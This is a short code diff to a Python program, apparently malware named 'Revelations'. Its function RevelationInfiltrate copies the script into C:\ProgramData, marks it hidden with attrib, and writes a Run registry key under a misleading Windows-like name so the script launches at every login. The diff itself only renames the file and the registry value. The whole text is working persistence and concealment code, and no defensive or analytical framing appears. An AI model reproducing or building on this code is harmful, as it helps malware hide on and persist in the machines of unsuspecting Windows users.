@@ -30,8 +30,8 @@ def RevelationsExtract(path):
 
 def RevelationInfiltrate():
     
-    ghostrp = (os.path.join('revelations.py')) 
-    ghostlgm = r'C:\ProgramData\revelations.py'
+    ghostrp = (os.path.join('rev.py')) 
+    ghostlgm = r'C:\ProgramData\rev.py'
     shutil.move(ghostrp,ghostlgm)
 
     hide = os.popen('attrib +h ' + ghostlgm)
@@ -43,7 +43,7 @@ def RevelationInfiltrate():
     new_file_path = fp + '\\' + file_name
     keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
     key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
-    SetValueEx(key2change, 'Winx86ProcessTypeTreeSix', 0, REG_SZ,
+    SetValueEx(key2change, 'Winx86ProcessTypeTreeRev', 0, REG_SZ,
                new_file_path)
 
 
